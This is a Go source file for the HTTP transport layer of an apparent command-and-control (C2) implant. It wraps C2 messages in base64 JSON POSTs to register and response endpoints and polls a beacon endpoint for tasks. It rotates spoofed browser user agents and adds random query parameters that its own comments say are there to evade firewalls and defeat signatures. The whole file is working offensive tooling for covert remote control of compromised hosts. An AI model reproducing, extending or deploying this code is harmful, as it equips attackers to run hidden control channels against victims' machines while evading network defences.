package transport

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
}

// HTTPTransport wraps C2 messages in HTTP requests for firewall evasion.
type HTTPTransport struct {
	baseURL    string
	sessionID  string
	client     *http.Client
	mu         sync.Mutex
	connected  bool
	recvBuf    []byte // buffered response from last send
	insecure   bool
}

func NewHTTPTransport(host string, port int, useTLS bool, insecure bool) *HTTPTransport {
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%d", scheme, host, port)

	t := &HTTPTransport{
		baseURL:  baseURL,
		insecure: insecure,
	}
	t.buildClient()
	return t
}

func (t *HTTPTransport) buildClient() {
	tlsConfig := &tls.Config{InsecureSkipVerify: t.insecure}
	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
		Proxy:           http.ProxyFromEnvironment,
	}
	t.client = &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

func (t *HTTPTransport) Connect() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.connected = true
	return nil
}

func (t *HTTPTransport) SetSessionID(sid string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.sessionID = sid
}

// Send encodes the payload as base64 JSON and POSTs to the C2.
// The response body is buffered for the next Recv() call.
func (t *HTTPTransport) Send(data []byte) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if !t.connected {
		return fmt.Errorf("not connected")
	}

	// Determine endpoint from message type
	endpoint := t.resolveEndpoint(data)

	encoded := base64.StdEncoding.EncodeToString(data)
	wrapper := map[string]string{"data": encoded}
	body, err := json.Marshal(wrapper)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	reqURL := t.addJitter(t.baseURL + endpoint)
	req, err := http.NewRequest("POST", reqURL, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("new request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := t.client.Do(req)
	if err != nil {
		t.connected = false
		return fmt.Errorf("http post: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("http status %d: %s", resp.StatusCode, string(respBody))
	}

	t.recvBuf = respBody
	return nil
}

// Recv returns the buffered response from the last Send, or polls for tasks.
func (t *HTTPTransport) Recv() ([]byte, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	// If we have buffered data from a Send response, return it
	if len(t.recvBuf) > 0 {
		data := t.recvBuf
		t.recvBuf = nil
		return t.decodeResponse(data)
	}

	// Poll for tasks via beacon endpoint
	if t.sessionID == "" {
		return nil, fmt.Errorf("no session id for beacon")
	}

	endpoint := fmt.Sprintf("/api/v1/beacon/%s", t.sessionID)
	reqURL := t.addJitter(t.baseURL + endpoint)
	req, err := http.NewRequest("GET", reqURL, nil)
	if err != nil {
		return nil, fmt.Errorf("new request: %w", err)
	}
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := t.client.Do(req)
	if err != nil {
		t.connected = false
		return nil, fmt.Errorf("http get: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}

	if resp.StatusCode == http.StatusNoContent || len(body) == 0 {
		return nil, nil // no tasks
	}

	return t.decodeResponse(body)
}

func (t *HTTPTransport) decodeResponse(data []byte) ([]byte, error) {
	var wrapper map[string]string
	if err := json.Unmarshal(data, &wrapper); err != nil {
		return data, nil // raw response, not wrapped
	}
	if encoded, ok := wrapper["data"]; ok {
		return base64.StdEncoding.DecodeString(encoded)
	}
	return data, nil
}

// resolveEndpoint determines the HTTP path based on the message type.
func (t *HTTPTransport) resolveEndpoint(data []byte) string {
	var msg struct {
		Type string `json:"type"`
	}
	if json.Unmarshal(data, &msg) == nil {
		switch msg.Type {
		case "register":
			return "/api/v1/register"
		case "response":
			return "/api/v1/response"
		}
	}
	return "/api/v1/response"
}

// addJitter appends a random query parameter to defeat caching/signatures.
func (t *HTTPTransport) addJitter(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	q := u.Query()
	q.Set("_", fmt.Sprintf("%d", time.Now().UnixNano()+rand.Int63n(10000)))
	u.RawQuery = q.Encode()
	return u.String()
}

func (t *HTTPTransport) Disconnect() {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.connected = false
}

func (t *HTTPTransport) Connected() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.connected
}
